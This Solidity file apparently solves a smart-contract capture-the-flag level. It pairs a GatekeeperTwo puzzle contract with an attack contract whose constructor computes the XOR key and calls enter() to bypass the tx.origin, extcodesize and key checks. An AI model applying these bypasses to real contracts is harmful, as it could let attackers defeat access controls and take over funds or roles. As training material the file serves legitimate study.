
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GKTAttack {


    // using a contract to fullfill gateOne, tx origin will be my address and msg.sender will be this contract
    // code written inside the constructor, therefore this contract will be "empty" for the blockchain and we fullfill gateTwo
    // Due to the nature of XOR; ^ we are able to calculate the Key with the two other parameters and create our personal key to pass gateThree

    constructor(address _gatekeeperTwoAddress)public {
      bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  uint64(0) - 1);
        /* GatekeeperTwo gateKeeperContract = GatekeeperTwo(_gatekeeperTwoAddress);
        gateKeeperContract.enter(key); */
         _gatekeeperTwoAddress.call(abi.encodeWithSignature("enter(bytes8)", key));
    }


}
